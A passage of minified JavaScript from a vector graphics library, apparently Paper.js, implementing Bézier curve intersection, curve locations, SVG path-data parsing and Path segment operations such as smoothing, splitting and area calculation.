                                              if (N - D > g - p) (F = (D + N) / 2), (c = i(s, (H = M.subdivide(n, 0.5))[0], o, r, a, l, !h, u, c, p, g, D, F)), (c = i(s, H[1], o, r, a, l, !h, u, c, p, g, F, N));
                                              else {
                                                  var H;
                                                  (B = (p + g) / 2), (c = i((H = M.subdivide(s, 0.5))[0], n, o, r, a, l, !h, u, c, p, B, D, N)), (c = i(H[1], n, o, r, a, l, !h, u, c, B, g, D, N));
                                              }
                                          else c = g - p >= 1e-9 ? i(s, n, o, r, a, l, !h, u, c, p, g, D, N) : i(n, s, r, o, a, l, h, u, c, D, N, p, g);
                                          return c;
                                      })(w ? s : i, w ? i : s, w ? o : r, w ? r : o, l, h, w, 0, 0, 0, 1, 0, 1),
                                !y || l.length === x)
                            )
                                for (p = 0; p < 4; p++) {
                                    var b = p >> 1,
                                        S = 1 & p,
                                        C = 6 * b,
                                        T = 6 * S,
                                        k = new c(i[C], i[C + 1]),
                                        I = new c(s[T], s[T + 1]);
                                    k.isClose(I, 1e-12) && t(l, h, r, b, o, S);
                                }
                        }
                    }
                    return l;
                }
                function o(e, i, n, s) {
                    var r = M.classify(e);
                    if ("loop" === r.type) {
                        var o = r.roots;
                        t(n, s, i, o[0], i, o[1]);
                    }
                    return n;
                }
                function a(t, e) {
                    function i(t) {
                        var e = t[6] - t[0],
                            i = t[7] - t[1];
                        return e * e + i * i;
                    }
                    var n = Math.abs,
                        s = _.getDistance,
                        r = 1e-7,
                        o = M.isStraight(t),
                        a = M.isStraight(e),
                        l = o && a,
                        h = i(t) < i(e),
                        u = h ? e : t,
                        d = h ? t : e,
                        f = u[0],
                        p = u[1],
                        g = u[6] - f,
                        v = u[7] - p;
                    if (s(f, p, g, v, d[0], d[1], !0) < r && s(f, p, g, v, d[6], d[7], !0) < r)
                        !l && s(f, p, g, v, u[2], u[3], !0) < r && s(f, p, g, v, u[4], u[5], !0) < r && s(f, p, g, v, d[2], d[3], !0) < r && s(f, p, g, v, d[4], d[5], !0) < r && (o = a = l = !0);
                    else if (l) return null;
                    if (o ^ a) return null;
                    for (var m = [t, e], y = [], w = 0; w < 4 && y.length < 2; w++) {
                        var x = 1 & w,
                            b = 1 ^ x,
                            S = w >> 1,
                            C = M.getTimeOf(m[x], new c(m[b][S ? 6 : 0], m[b][S ? 7 : 1]));
                        if (null != C) {
                            var T = x ? [S, C] : [C, S];
                            (!y.length || (n(T[0] - y[0][0]) > 1e-8 && n(T[1] - y[0][1]) > 1e-8)) && y.push(T);
                        }
                        if (w > 2 && !y.length) break;
                    }
                    if (2 !== y.length) y = null;
                    else if (!l) {
                        var k = M.getPart(t, y[0][0], y[1][0]),
                            I = M.getPart(e, y[0][1], y[1][1]);
                        (n(I[2] - k[2]) > r || n(I[3] - k[3]) > r || n(I[4] - k[4]) > r || n(I[5] - k[5]) > r) && (y = null);
                    }
                    return y;
                }
                return {
                    getIntersections: function (t) {
                        var e = this.getValues(),
                            i = t && t !== this && t.getValues();
                        return i ? r(e, i, this, t, []) : o(e, this, []);
                    },
                    statics: {
                        getOverlaps: a,
                        getIntersections: function (t, e, i, n, a, l) {
                            var h = !e;
                            h && (e = t);
                            for (var u, c, d = t.length, f = e.length, p = [], g = [], v = 0; v < f; v++) p[v] = e[v].getValues(a);
                            for (v = 0; v < d; v++) {
                                var m = t[v],
                                    _ = h ? p[v] : m.getValues(n),
                                    y = m.getPath();
                                y !== c && ((c = y), (u = []), g.push(u)), h && o(_, m, u, i);
                                for (var w = h ? v + 1 : 0; w < f; w++) {
                                    if (l && u.length) return u;
                                    r(_, p[w], m, e[w], u, i);
                                }
                            }
                            (u = []), (v = 0);
                            for (var x = g.length; v < x; v++) s.push(u, g[v]);
                            return u;
                        },
                        getCurveLineIntersections: n,
                        getTimesWithTangent: function (t, e) {
                            var i = t[0],
                                n = t[1],
                                s = t[2],
                                r = t[3],
                                o = t[4],
                                a = t[5],
                                l = t[6],
                                u = t[7],
                                c = e.normalize(),
                                d = c.x,
                                f = c.y,
                                p = 3 * l - 9 * o + 9 * s - 3 * i,
                                g = 3 * u - 9 * a + 9 * r - 3 * n,
                                v = 6 * o - 12 * s + 6 * i,
                                m = 6 * a - 12 * r + 6 * n,
                                _ = 3 * s - 3 * i,
                                y = 3 * r - 3 * n,
                                w = 2 * p * f - 2 * g * d,
                                x = [];
                            if (Math.abs(w) < h.CURVETIME_EPSILON) {
                                if (0 != (w = p * m - g * v)) {
                                    var b = -(p * y - g * _) / w;
                                    b >= 0 && b <= 1 && x.push(b);
                                }
                            } else {
                                var S = (v * v - 4 * p * _) * f * f + (-2 * v * m + 4 * g * _ + 4 * p * y) * d * f + (m * m - 4 * g * y) * d * d,
                                    C = v * f - m * d;
                                if (S >= 0 && 0 != w) {
                                    var T = Math.sqrt(S),
                                        k = -(C + T) / w,
                                        I = (-C + T) / w;
                                    k >= 0 && k <= 1 && x.push(k), I >= 0 && I <= 1 && x.push(I);
                                }
                            }
                            return x;
                        },
                    },
                };
            })()
        ),
        z = s.extend(
            {
                _class: "CurveLocation",
                initialize: function (t, e, i, n, s) {
                    if (e >= 0.99999999) {
                        var r = t.getNext();
                        r && ((e = 0), (t = r));
                    }
                    this._setCurve(t), (this._time = e), (this._point = i || t.getPointAtTime(e)), (this._overlap = n), (this._distance = s), (this._intersection = this._next = this._previous = null);
                },
                _setCurve: function (t) {
                    var e = t._path;
                    (this._path = e), (this._version = e ? e._version : 0), (this._curve = t), (this._segment = null), (this._segment1 = t._segment1), (this._segment2 = t._segment2);
                },
                _setSegment: function (t) {
                    this._setCurve(t.getCurve()), (this._segment = t), (this._time = t === this._segment1 ? 0 : 1), (this._point = t._point.clone());
                },
                getSegment: function () {
                    var t = this._segment;
                    if (!t) {
                        var e = this.getCurve(),
                            i = this.getTime();
                        0 === i ? (t = e._segment1) : 1 === i ? (t = e._segment2) : null != i && (t = e.getPartLength(0, i) < e.getPartLength(i, 1) ? e._segment1 : e._segment2), (this._segment = t);
                    }
                    return t;
                },
                getCurve: function () {
                    var t = this._path,
                        e = this;
                    function i(t) {
                        var i = t && t.getCurve();
                        if (i && null != (e._time = i.getTimeOf(e._point))) return e._setCurve(i), i;
                    }
                    return t && t._version !== this._version && (this._time = this._offset = this._curveOffset = this._curve = null), this._curve || i(this._segment) || i(this._segment1) || i(this._segment2.getPrevious());
                },
                getPath: function () {
                    var t = this.getCurve();
                    return t && t._path;
                },
                getIndex: function () {
                    var t = this.getCurve();
                    return t && t.getIndex();
                },
                getTime: function () {
                    var t = this.getCurve(),
                        e = this._time;
                    return t && null == e ? (this._time = t.getTimeOf(this._point)) : e;
                },
                getParameter: "#getTime",
                getPoint: function () {
                    return this._point;
                },
                getOffset: function () {
                    var t = this._offset;
                    if (null == t) {
                        t = 0;
                        var e = this.getPath(),
                            i = this.getIndex();
                        if (e && null != i) for (var n = e.getCurves(), s = 0; s < i; s++) t += n[s].getLength();
                        this._offset = t += this.getCurveOffset();
                    }
                    return t;
                },
                getCurveOffset: function () {
                    var t = this._curveOffset;
                    if (null == t) {
                        var e = this.getCurve(),
                            i = this.getTime();
                        this._curveOffset = t = null != i && e && e.getPartLength(0, i);
                    }
                    return t;
                },
                getIntersection: function () {
                    return this._intersection;
                },
                getDistance: function () {
                    return this._distance;
                },
                divide: function () {
                    var t = this.getCurve(),
                        e = t && t.divideAtTime(this.getTime());
                    return e && this._setSegment(e._segment1), e;
                },
                split: function () {
                    var t = this.getCurve(),
                        e = t._path,
                        i = t && t.splitAtTime(this.getTime());
                    return i && this._setSegment(e.getLastSegment()), i;
                },
                equals: function (t, e) {
                    var i = this === t;
                    if (!i && t instanceof z) {
                        var n = this.getCurve(),
                            s = t.getCurve(),
                            r = n._path;
                        if (r === s._path) {
                            var o = Math.abs,
                                a = o(this.getOffset() - t.getOffset()),
                                l = !e && this._intersection,
                                h = !e && t._intersection;
                            i = (a < 1e-7 || (r && o(r.getLength() - a) < 1e-7)) && ((!l && !h) || (l && h && l.equals(h, !0)));
                        }
                    }
                    return i;
                },
                toString: function () {
                    var t = [],
                        e = this.getPoint(),
                        i = l.instance;
                    e && t.push("point: " + e);
                    var n = this.getIndex();
                    null != n && t.push("index: " + n);
                    var s = this.getTime();
                    return null != s && t.push("time: " + i.number(s)), null != this._distance && t.push("distance: " + i.number(this._distance)), "{ " + t.join(", ") + " }";
                },
                isTouching: function () {
                    var t = this._intersection;
                    if (t && this.getTangent().isCollinear(t.getTangent())) {
                        var e = this.getCurve(),
                            i = t.getCurve();
                        return !(e.isStraight() && i.isStraight() && e.getLine().intersect(i.getLine()));
                    }
                    return !1;
                },
                isCrossing: function () {
                    var t = this._intersection;
                    if (!t) return !1;
                    var e = this.getTime(),
                        i = t.getTime(),
                        n = 1 - 1e-8,
                        s = e >= 1e-8 && e <= n,
                        r = i >= 1e-8 && i <= n;
                    if (s && r) return !this.isTouching();
                    var o = this.getCurve(),
                        a = e < 1e-8 ? o.getPrevious() : o,
                        l = t.getCurve(),
                        h = i < 1e-8 ? l.getPrevious() : l;
                    if ((e > n && (o = o.getNext()), i > n && (l = l.getNext()), !(a && o && h && l))) return !1;
                    var u = [];
                    function c(t, e) {
                        var i = t.getValues(),
                            n = M.classify(i).roots || M.getPeaks(i),
                            s = n.length,
                            r = e && s > 1 ? n[s - 1] : s > 0 ? n[0] : 0.5;
                        u.push(M.getLength(i, e ? r : 0, e ? 1 : r) / 2);
                    }
                    function d(t, e, i) {
                        return e < i ? t > e && t < i : t > e || t < i;
                    }
                    s || (c(a, !0), c(o, !1)), r || (c(h, !0), c(l, !1));
                    var f = this.getPoint(),
                        p = Math.min.apply(Math, u),
                        g = s ? o.getTangentAtTime(e) : o.getPointAt(p).subtract(f),
                        v = s ? g.negate() : a.getPointAt(-p).subtract(f),
                        m = r ? l.getTangentAtTime(i) : l.getPointAt(p).subtract(f),
                        _ = r ? m.negate() : h.getPointAt(-p).subtract(f),
                        y = v.getAngle(),
                        w = g.getAngle(),
                        x = _.getAngle(),
                        b = m.getAngle();
                    return !!(s ? d(y, x, b) ^ d(w, x, b) && d(y, b, x) ^ d(w, b, x) : d(x, y, w) ^ d(b, y, w) && d(x, w, y) ^ d(b, w, y));
                },
                hasOverlap: function () {
                    return !!this._overlap;
                },
            },
            s.each(
                M._evaluateMethods,
                function (t) {
                    var e = t + "At";
                    this[t] = function () {
                        var t = this.getCurve(),
                            i = this.getTime();
                        return null != i && t && t[e](i, !0);
                    };
                },
                { preserve: !0 }
            ),
            new (function () {
                function t(t, e, i) {
                    var n = t.length,
                        s = 0,
                        r = n - 1;
                    function o(i, s) {
                        for (var r = i + s; r >= -1 && r <= n; r += s) {
                            var o = t[((r % n) + n) % n];
                            if (!e.getPoint().isClose(o.getPoint(), 1e-7)) break;
                            if (e.equals(o)) return o;
                        }
                        return null;
                    }
                    for (; s <= r; ) {
                        var a,
                            l = (s + r) >>> 1,
                            h = t[l];
                        if (i && (a = e.equals(h) ? h : o(l, -1) || o(l, 1))) return e._overlap && (a._overlap = a._intersection._overlap = !0), a;
                        var u = e.getPath(),
                            c = h.getPath();
                        (u !== c ? u._id - c._id : e.getIndex() + e.getTime() - (h.getIndex() + h.getTime())) < 0 ? (r = l - 1) : (s = l + 1);
                    }
                    return t.splice(s, 0, e), e;
                }
                return {
                    statics: {
                        insert: t,
                        expand: function (e) {
                            for (var i = e.slice(), n = e.length - 1; n >= 0; n--) t(i, e[n]._intersection, !1);
                            return i;
                        },
                    },
                };
            })()
        ),
        A = w.extend({
            _class: "PathItem",
            _selectBounds: !1,
            _canScaleStroke: !0,
            beans: !0,
            initialize: function () {},
            statics: {
                create: function (t) {
                    var e, i, n;
                    if ((s.isPlainObject(t) ? ((i = t.segments), (e = t.pathData)) : Array.isArray(t) ? (i = t) : "string" == typeof t && (e = t), i)) {
                        var r = i[0];
                        n = r && Array.isArray(r[0]);
                    } else e && (n = (e.match(/m/gi) || []).length > 1 || /z\s*\S+/i.test(e));
                    return new (n ? L : E)(t);
                },
            },
            _asPathItem: function () {
                return this;
            },
            isClockwise: function () {
                return this.getArea() >= 0;
            },
            setClockwise: function (t) {
                this.isClockwise() != (t = !!t) && this.reverse();
            },
            setPathData: function (t) {
                var e,
                    i,
                    n,
                    s = t && t.match(/[mlhvcsqtaz][^mlhvcsqtaz]*/gi),
                    r = !1,
                    o = new c(),
                    a = new c();
                function l(t, i) {
                    var n = +e[t];
                    return r && (n += o[i]), n;
                }
                function h(t) {
                    return new c(l(t, "x"), l(t + 1, "y"));
                }
                this.clear();
                for (var u = 0, d = s && s.length; u < d; u++) {
                    var p = s[u],
                        g = p[0],
                        v = g.toLowerCase(),
                        m = (e = p.match(/[+-]?(?:\d*\.\d+|\d+\.?)(?:[eE][+-]?\d+)?/g)) && e.length;
                    switch (((r = g === v), "z" !== i || /[mz]/.test(v) || this.moveTo(o), v)) {
                        case "m":
                        case "l":
                            for (var _ = "m" === v, y = 0; y < m; y += 2) this[_ ? "moveTo" : "lineTo"]((o = h(y))), _ && ((a = o), (_ = !1));
                            n = o;
                            break;
                        case "h":
                        case "v":
                            var w = "h" === v ? "x" : "y";
                            o = o.clone();
                            for (y = 0; y < m; y++) (o[w] = l(y, w)), this.lineTo(o);
                            n = o;
                            break;
                        case "c":
                            for (y = 0; y < m; y += 6) this.cubicCurveTo(h(y), (n = h(y + 2)), (o = h(y + 4)));
                            break;
                        case "s":
                            for (y = 0; y < m; y += 4) this.cubicCurveTo(/[cs]/.test(i) ? o.multiply(2).subtract(n) : o, (n = h(y)), (o = h(y + 2))), (i = v);
                            break;
                        case "q":
                            for (y = 0; y < m; y += 4) this.quadraticCurveTo((n = h(y)), (o = h(y + 2)));
                            break;
                        case "t":
                            for (y = 0; y < m; y += 2) this.quadraticCurveTo((n = /[qt]/.test(i) ? o.multiply(2).subtract(n) : o), (o = h(y))), (i = v);
                            break;
                        case "a":
                            for (y = 0; y < m; y += 7) this.arcTo((o = h(y + 5)), new f(+e[y], +e[y + 1]), +e[y + 2], +e[y + 4], +e[y + 3]);
                            break;
                        case "z":
                            this.closePath(1e-12), (o = a);
                    }
                    i = v;
                }
            },
            _canComposite: function () {
                return !(this.hasFill() && this.hasStroke());
            },
            _contains: function (t) {
                var e = t.isInside(this.getBounds({ internal: !0, handle: !0 })) ? this._getWinding(t) : {};
                return e.onPath || !!("evenodd" === this.getFillRule() ? 1 & e.windingL || 1 & e.windingR : e.winding);
            },
            getIntersections: function (t, e, i, n) {
                var s = this === t || !t,
                    r = this._matrix._orNullIfIdentity(),
                    o = s ? r : (i || t._matrix)._orNullIfIdentity();
                return s || this.getBounds(r).intersects(t.getBounds(o), 1e-12) ? M.getIntersections(this.getCurves(), !s && t.getCurves(), e, r, o, n) : [];
            },
            getCrossings: function (t) {
                return this.getIntersections(t, function (t) {
                    return t.hasOverlap() || t.isCrossing();
                });
            },
            getNearestLocation: function () {
                for (var t = c.read(arguments), e = this.getCurves(), i = 1 / 0, n = null, s = 0, r = e.length; s < r; s++) {
                    var o = e[s].getNearestLocation(t);
                    o._distance < i && ((i = o._distance), (n = o));
                }
                return n;
            },
            getNearestPoint: function () {
                var t = this.getNearestLocation.apply(this, arguments);
                return t ? t.getPoint() : t;
            },
            interpolate: function (t, e, i) {
                var n = !this._children,
                    s = n ? "_segments" : "_children",
                    r = t[s],
                    o = e[s],
                    a = this[s];
                if (!r || !o || r.length !== o.length) throw new Error("Invalid operands in interpolate() call: " + t + ", " + e);
                var l = a.length,
                    h = o.length;
                if (l < h) for (var u = n ? O : E, c = l; c < h; c++) this.add(new u());
                else l > h && this[n ? "removeSegments" : "removeChildren"](h, l);
                for (c = 0; c < h; c++) a[c].interpolate(r[c], o[c], i);
                n && (this.setClosed(t._closed), this._changed(9));
            },
            compare: function (t) {
                var e = !1;
                if (t) {
                    var i = this._children || [this],
                        n = t._children ? t._children.slice() : [t],
                        s = i.length,
                        r = n.length,
                        o = [],
                        a = 0;
                    e = !0;
                    for (var l = s - 1; l >= 0 && e; l--) {
                        var h = i[l];
                        e = !1;
                        for (var u = r - 1; u >= 0 && !e; u--) h.compare(n[u]) && (o[u] || ((o[u] = !0), a++), (e = !0));
                    }
                    e = e && a === r;
                }
                return e;
            },
        }),
        E = A.extend(
            {
                _class: "Path",
                _serializeFields: { segments: [], closed: !1 },
                initialize: function (t) {
                    (this._closed = !1), (this._segments = []), (this._version = 0);
                    var i = Array.isArray(t) ? ("object" == typeof t[0] ? t : arguments) : !t || t.size !== e || (t.x === e && t.point === e) ? null : arguments;
                    i && i.length > 0 ? this.setSegments(i) : ((this._curves = e), (this._segmentSelection = 0), i || "string" != typeof t || (this.setPathData(t), (t = null))), this._initialize(!i && t);
                },
                _equals: function (t) {
                    return this._closed === t._closed && s.equals(this._segments, t._segments);
                },
                copyContent: function (t) {
                    this.setSegments(t._segments), (this._closed = t._closed);
                },
                _changed: function t(i) {
                    if ((t.base.call(this, i), 8 & i)) {
                        if (((this._length = this._area = e), 32 & i)) this._version++;
                        else if (this._curves) for (var n = 0, s = this._curves.length; n < s; n++) this._curves[n]._changed();
                    } else 64 & i && (this._bounds = e);
                },
                getStyle: function () {
                    var t = this._parent;
                    return (t instanceof L ? t : this)._style;
                },
                getSegments: function () {
                    return this._segments;
                },
                setSegments: function (t) {
                    var i = this.isFullySelected(),
                        n = t && t.length;
                    if (((this._segments.length = 0), (this._segmentSelection = 0), (this._curves = e), n)) {
                        var s = t[n - 1];
                        "boolean" == typeof s && (this.setClosed(s), n--), this._add(O.readList(t, 0, {}, n));
                    }
                    i && this.setFullySelected(!0);
                },
                getFirstSegment: function () {
                    return this._segments[0];
                },
                getLastSegment: function () {
                    return this._segments[this._segments.length - 1];
                },
                getCurves: function () {
                    var t = this._curves,
                        e = this._segments;
                    if (!t) {
                        var i = this._countCurves();
                        t = this._curves = new Array(i);
                        for (var n = 0; n < i; n++) t[n] = new M(this, e[n], e[n + 1] || e[0]);
                    }
                    return t;
                },
                getFirstCurve: function () {
                    return this.getCurves()[0];
                },
                getLastCurve: function () {
                    var t = this.getCurves();
                    return t[t.length - 1];
                },
                isClosed: function () {
                    return this._closed;
                },
                setClosed: function (t) {
                    if (this._closed != (t = !!t)) {
                        if (((this._closed = t), this._curves)) {
                            var e = (this._curves.length = this._countCurves());
                            t && (this._curves[e - 1] = new M(this, this._segments[e - 1], this._segments[0]));
                        }
                        this._changed(41);
                    }
                },
            },
            {
                beans: !0,
                getPathData: function (t, e) {
                    var i,
                        n,
                        s,
                        r,
                        o,
                        a,
                        h,
                        u,
                        c = this._segments,
                        d = c.length,
                        f = new l(e),
                        p = new Array(6),
                        g = !0,
                        v = [];
                    function m(e, l) {
                        if ((e._transformCoordinates(t, p), (i = p[0]), (n = p[1]), g)) v.push("M" + f.pair(i, n)), (g = !1);
                        else if (((o = p[2]), (a = p[3]), o === i && a === n && h === s && u === r)) {
                            if (!l) {
                                var c = i - s,
                                    d = n - r;
                                v.push(0 === c ? "v" + f.number(d) : 0 === d ? "h" + f.number(c) : "l" + f.pair(c, d));
                            }
                        } else v.push("c" + f.pair(h - s, u - r) + " " + f.pair(o - s, a - r) + " " + f.pair(i - s, n - r));
                        (s = i), (r = n), (h = p[4]), (u = p[5]);
                    }
                    if (!d) return "";
                    for (var _ = 0; _ < d; _++) m(c[_]);
                    return this._closed && d > 0 && (m(c[0], !0), v.push("z")), v.join("");
                },
                isEmpty: function () {
                    return !this._segments.length;
                },
                _transformContent: function (t) {
                    for (var e = this._segments, i = new Array(6), n = 0, s = e.length; n < s; n++) e[n]._transformCoordinates(t, i, !0);
                    return !0;
                },
                _add: function (t, e) {
                    for (var i = this._segments, n = this._curves, r = t.length, o = null == e, a = ((e = o ? i.length : e), 0); a < r; a++) {
                        var l = t[a];
                        l._path && (l = t[a] = l.clone()), (l._path = this), (l._index = e + a), l._selection && this._updateSelection(l, 0, l._selection);
                    }
                    if (o) s.push(i, t);
                    else {
                        i.splice.apply(i, [e, 0].concat(t));
                        a = e + r;
                        for (var h = i.length; a < h; a++) i[a]._index = a;
                    }
                    if (n) {
                        var u = this._countCurves(),
                            c = e > 0 && e + r - 1 === u ? e - 1 : e,
                            d = c,
                            f = Math.min(c + r, u);
                        t._curves && (n.splice.apply(n, [c, 0].concat(t._curves)), (d += t._curves.length));
                        for (a = d; a < f; a++) n.splice(a, 0, new M(this, null, null));
                        this._adjustCurves(c, f);
                    }
                    return this._changed(41), t;
                },
                _adjustCurves: function (t, e) {
                    for (var i, n = this._segments, s = this._curves, r = t; r < e; r++) ((i = s[r])._path = this), (i._segment1 = n[r]), (i._segment2 = n[r + 1] || n[0]), i._changed();
                    (i = s[this._closed && !t ? n.length - 1 : t - 1]) && ((i._segment2 = n[t] || n[0]), i._changed()), (i = s[e]) && ((i._segment1 = n[e]), i._changed());
                },
                _countCurves: function () {
                    var t = this._segments.length;
                    return !this._closed && t > 0 ? t - 1 : t;
                },
                add: function (t) {
                    return arguments.length > 1 && "number" != typeof t ? this._add(O.readList(arguments)) : this._add([O.read(arguments)])[0];
                },
                insert: function (t, e) {
                    return arguments.length > 2 && "number" != typeof e ? this._add(O.readList(arguments, 1), t) : this._add([O.read(arguments, 1)], t)[0];
                },
                addSegment: function () {
                    return this._add([O.read(arguments)])[0];
                },
                insertSegment: function (t) {
                    return this._add([O.read(arguments, 1)], t)[0];
                },
                addSegments: function (t) {
                    return this._add(O.readList(t));
                },
                insertSegments: function (t, e) {
                    return this._add(O.readList(e), t);
                },
                removeSegment: function (t) {
                    return this.removeSegments(t, t + 1)[0] || null;
                },
                removeSegments: function (t, e, i) {
                    (t = t || 0), (e = s.pick(e, this._segments.length));
                    var n = this._segments,
                        r = this._curves,
                        o = n.length,
                        a = n.splice(t, e - t),
                        l = a.length;
                    if (!l) return a;
                    for (var h = 0; h < l; h++) {
                        var u = a[h];
                        u._selection && this._updateSelection(u, u._selection, 0), (u._index = u._path = null);
                    }
                    h = t;
                    for (var c = n.length; h < c; h++) n[h]._index = h;
                    if (r) {
                        var d = t > 0 && e === o + (this._closed ? 1 : 0) ? t - 1 : t;
                        for (h = (r = r.splice(d, l)).length - 1; h >= 0; h--) r[h]._path = null;
                        i && (a._curves = r.slice(1)), this._adjustCurves(d, d);
                    }
                    return this._changed(41), a;
                },
                clear: "#removeSegments",
                hasHandles: function () {
                    for (var t = this._segments, e = 0, i = t.length; e < i; e++) if (t[e].hasHandles()) return !0;
                    return !1;
                },
                clearHandles: function () {
                    for (var t = this._segments, e = 0, i = t.length; e < i; e++) t[e].clearHandles();
                },
                getLength: function () {
                    if (null == this._length) {
                        for (var t = this.getCurves(), e = 0, i = 0, n = t.length; i < n; i++) e += t[i].getLength();
                        this._length = e;
                    }
                    return this._length;
                },
                getArea: function () {
                    var t = this._area;
                    if (null == t) {
                        var e = this._segments,
                            i = this._closed;
                        t = 0;
                        for (var n = 0, s = e.length; n < s; n++) {
                            var r = n + 1 === s;
                            t += M.getArea(M.getValues(e[n], e[r ? 0 : n + 1], null, r && !i));
                        }
                        this._area = t;
                    }
                    return t;
                },
                isFullySelected: function () {
                    var t = this._segments.length;
                    return this.isSelected() && t > 0 && this._segmentSelection === 7 * t;
                },
                setFullySelected: function (t) {
                    t && this._selectSegments(!0), this.setSelected(t);
                },
                setSelection: function t(e) {
                    1 & e || this._selectSegments(!1), t.base.call(this, e);
                },
                _selectSegments: function (t) {
                    var e = this._segments,
                        i = e.length,
                        n = t ? 7 : 0;
                    this._segmentSelection = n * i;
                    for (var s = 0; s < i; s++) e[s]._selection = n;
                },
                _updateSelection: function (t, e, i) {
                    (t._selection = i), (this._segmentSelection += i - e) > 0 && this.setSelected(!0);
                },
                divideAt: function (t) {
                    var e,
                        i = this.getLocationAt(t);
                    return i && (e = i.getCurve().divideAt(i.getCurveOffset())) ? e._segment1 : null;
                },
                splitAt: function (t) {
                    var e = this.getLocationAt(t),
                        i = e && e.index,
                        n = e && e.time;
                    n > 1 - 1e-8 && (i++, (n = 0));
                    var s = this.getCurves();
                    if (i >= 0 && i < s.length) {
                        n >= 1e-8 && s[i++].divideAtTime(n);
                        var r,
                            o = this.removeSegments(i, this._segments.length, !0);
                        return this._closed ? (this.setClosed(!1), (r = this)) : ((r = new E(w.NO_INSERT)).insertAbove(this), r.copyAttributes(this)), r._add(o, 0), this.addSegment(o[0]), r;
                    }
                    return null;
                },
                split: function (t, i) {
                    var n,
                        s = i === e ? t : (n = this.getCurves()[t]) && n.getLocationAtTime(i);
                    return null != s ? this.splitAt(s) : null;
                },
                join: function (t, e) {
                    var i = e || 0;
                    if (t && t !== this) {
                        var n = t._segments,
                            s = this.getLastSegment(),
                            r = t.getLastSegment();
                        if (!r) return this;
                        s && s._point.isClose(r._point, i) && t.reverse();
                        var o = t.getFirstSegment();
                        if (s && s._point.isClose(o._point, i)) s.setHandleOut(o._handleOut), this._add(n.slice(1));
                        else {
                            var a = this.getFirstSegment();
                            a && a._point.isClose(o._point, i) && t.reverse(), (r = t.getLastSegment()), a && a._point.isClose(r._point, i) ? (a.setHandleIn(r._handleIn), this._add(n.slice(0, n.length - 1), 0)) : this._add(n.slice());
                        }
                        t._closed && this._add([n[0]]), t.remove();
                    }
                    var l = this.getFirstSegment(),
                        h = this.getLastSegment();
                    return l !== h && l._point.isClose(h._point, i) && (l.setHandleIn(h._handleIn), h.remove(), this.setClosed(!0)), this;
                },
                reduce: function (t) {
                    for (var e = this.getCurves(), i = t && t.simplify, n = i ? 1e-7 : 0, s = e.length - 1; s >= 0; s--) {
                        var r = e[s];
                        !r.hasHandles() && (!r.hasLength(n) || (i && r.isCollinear(r.getNext()))) && r.remove();
                    }
                    return this;
                },
                reverse: function () {
                    this._segments.reverse();
                    for (var t = 0, e = this._segments.length; t < e; t++) {
                        var i = this._segments[t],
                            n = i._handleIn;
                        (i._handleIn = i._handleOut), (i._handleOut = n), (i._index = t);
                    }
                    (this._curves = null), this._changed(9);
                },
                flatten: function (t) {
                    for (var e = new $(this, t || 0.25, 256, !0).parts, i = e.length, n = [], s = 0; s < i; s++) n.push(new O(e[s].curve.slice(0, 2)));
                    !this._closed && i > 0 && n.push(new O(e[i - 1].curve.slice(6))), this.setSegments(n);
                },
                simplify: function (t) {
                    var e = new j(this).fit(t || 2.5);
                    return e && this.setSegments(e), !!e;
                },
                smooth: function (t) {
                    var i = this,
                        n = t || {},
                        s = n.type || "asymmetric",
                        r = this._segments,
                        o = r.length,
                        a = this._closed;
                    function l(t, e) {
                        var n = t && t.index;
                        if (null != n) {
                            var s = t.path;
                            if (s && s !== i) throw new Error(t._class + " " + n + " of " + s + " is not part of " + i);
                            e && t instanceof M && n++;
                        } else n = "number" == typeof t ? t : e;
                        return Math.min(n < 0 && a ? n % o : n < 0 ? n + o : n, o - 1);
                    }
                    var h = a && n.from === e && n.to === e,
                        u = l(n.from, 0),
                        c = l(n.to, o - 1);
                    if (u > c)
                        if (a) u -= o;
                        else {
                            var d = u;
                            (u = c), (c = d);
                        }
                    if (/^(?:asymmetric|continuous)$/.test(s)) {
                        var f = "asymmetric" === s,
                            p = Math.min,
                            g = c - u + 1,
                            v = g - 1,
                            m = h ? p(g, 4) : 1,
                            _ = m,
                            y = m,
                            w = [];
                        if ((a || ((_ = p(1, u)), (y = p(1, o - c - 1))), (v += _ + y) <= 1)) return;
                        for (var x = 0, b = u - _; x <= v; x++, b++) w[x] = r[(b < 0 ? b + o : b) % o]._point;
                        var S = w[0]._x + 2 * w[1]._x,
                            C = w[0]._y + 2 * w[1]._y,
                            T = 2,
                            k = v - 1,
                            I = [S],
                            O = [C],
                            P = [T],
                            z = [],
                            A = [];
                        for (x = 1; x < v; x++) {
                            var E = x < k,
                                L = E ? 4 : f ? 2 : 7,
                                $ = E ? 4 : f ? 3 : 8,
                                j = E ? 2 : f ? 0 : 1,
                                D = (E ? 1 : f ? 1 : 2) / T;
                            (T = P[x] = L - D), (S = I[x] = $ * w[x]._x + j * w[x + 1]._x - D * S), (C = O[x] = $ * w[x]._y + j * w[x + 1]._y - D * C);
                        }
                        (z[k] = I[k] / P[k]), (A[k] = O[k] / P[k]);
                        for (x = v - 2; x >= 0; x--) (z[x] = (I[x] - z[x + 1]) / P[x]), (A[x] = (O[x] - A[x + 1]) / P[x]);
                        (z[v] = (3 * w[v]._x - z[k]) / 2), (A[v] = (3 * w[v]._y - A[k]) / 2);
                        x = _;
                        var N = v - y;
                        for (b = u; x <= N; x++, b++) {
                            var F = r[b < 0 ? b + o : b],
                                B = F._point,
                                H = z[x] - B._x,
                                q = A[x] - B._y;
                            (h || x < N) && F.setHandleOut(H, q), (h || x > _) && F.setHandleIn(-H, -q);
                        }
                    } else for (x = u; x <= c; x++) r[x < 0 ? x + o : x].smooth(n, !h && x === u, !h && x === c);
                },
                toShape: function (t) {
                    if (!this._closed) return null;
                    var i,
                        n,
                        s,
                        r,
                        o,
                        a,
                        l,
                        u = this._segments;
                    function c(t, e) {
                        var i = u[t],
                            n = i.getNext(),
                            s = u[e],
                            r = s.getNext();
                        return i._handleOut.isZero() && n._handleIn.isZero() && s._handleOut.isZero() && r._handleIn.isZero() && n._point.subtract(i._point).isCollinear(r._point.subtract(s._point));
                    }
                    function d(t) {
                        var e = u[t],
                            i = e.getNext(),
                            n = e._handleOut,
                            s = i._handleIn,
                            r = 0.5522847498307936;
                        if (n.isOrthogonal(s)) {
                            var o = e._point,
                                a = i._point,
                                l = new _(o, n, !0).intersect(new _(a, s, !0), !0);
                            return l && h.isZero(n.getLength() / l.subtract(o).getLength() - r) && h.isZero(s.getLength() / l.subtract(a).getLength() - r);
                        }
                        return !1;
                    }
                    function p(t, e) {
                        return u[t]._point.getDistance(u[e]._point);
                    }
                    if (
                        (!this.hasHandles() &&
                        4 === u.length &&
                        c(0, 2) &&
